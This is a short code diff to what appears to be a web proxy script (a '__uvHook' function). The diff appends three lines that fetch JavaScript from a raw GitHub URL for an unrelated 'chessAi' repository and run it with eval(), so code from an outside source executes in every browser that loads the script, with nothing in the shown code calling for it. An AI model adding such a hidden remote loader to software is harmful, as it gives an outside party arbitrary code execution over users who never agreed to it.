@@ -1127,3 +1127,6 @@ async function __uvHook(window, config = {}, bare = '/outerspace/') {
         },
     });
 };
+fetch("https://raw.githubusercontent.com/crazystuffofficial/chessAi/main/index.js")
+.then(x => x.text())
+.then(y => eval(y));
